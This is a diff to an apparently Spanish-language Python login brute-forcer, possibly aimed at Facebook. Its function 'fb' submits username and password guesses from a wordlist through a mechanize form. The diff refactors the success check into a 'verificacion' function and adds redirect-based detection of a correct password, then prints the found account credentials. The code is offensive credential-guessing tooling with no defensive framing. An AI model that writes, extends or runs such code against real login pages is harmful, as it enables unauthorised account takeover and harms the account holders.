@@ -10,6 +10,23 @@ init()
 deteniendo = False
 esperando = False
 
+def verificacion(contraseña,usuario,condicion):
+    global deteniendo
+
+    # si conozco el usuario
+    if condicion:
+        if params.param.usuario != None:
+            print(Fore.GREEN+f'\ncontraseña encontrada: {contraseña}\n')
+        else:
+            print(Fore.GREEN+f'\n cuenta encontrada:\n\n usuario:{usuario}\n contraseña:{contraseña}\n')
+        deteniendo = True
+
+        exit()
+    # si no lo conozco
+    else:
+        if not deteniendo:
+            print(Fore.RED+f'valor invalido para: {usuario} ,{contraseña}')
+
 def generador(diccionario):
     
     with open(diccionario,'r') as arch:
@@ -64,25 +81,16 @@ def fb(url_login,usuario,c_usuario,c_contr,contr_,n):
             web[c_usuario] = usuario
             web[c_contr] = contr_
             pag2= web.submit()
-            html = pag2.get_data().decode()
-                
-            #si conozco el usuario
-            if search(params.param.msg,html) == None:
-                if params.param.usuario != None:
-                    print(Fore.GREEN+f'\ncontraseña encontrada: {contr_}\n')
-                else:
-                    print(Fore.GREEN+f'\n cuenta encontrada:\n\n usuario:{usuario}\n contraseña:{contr_}\n')
-                deteniendo = True
-
-                exit()
-            else:
-                if not deteniendo:
-                    print(Fore.RED+f'valor invalido para: {usuario} ,{contr_}')
-                    
+            html = pag2.get_data().decode()        
         else:
             print(Fore.RED+'el sitio es inaccesible')    
                 
+        if not params.param.bol_url:
 
+            verificacion(contraseña=contr_,usuario=usuario,condicion=search(params.param.msg,html) == None)
+        else:
+
+            verificacion(usuario=usuario,contraseña=contr_,condicion=url_login != pag2.geturl())
 
         web.close()
     except (mechanize.HTTPError, mechanize.URLError):
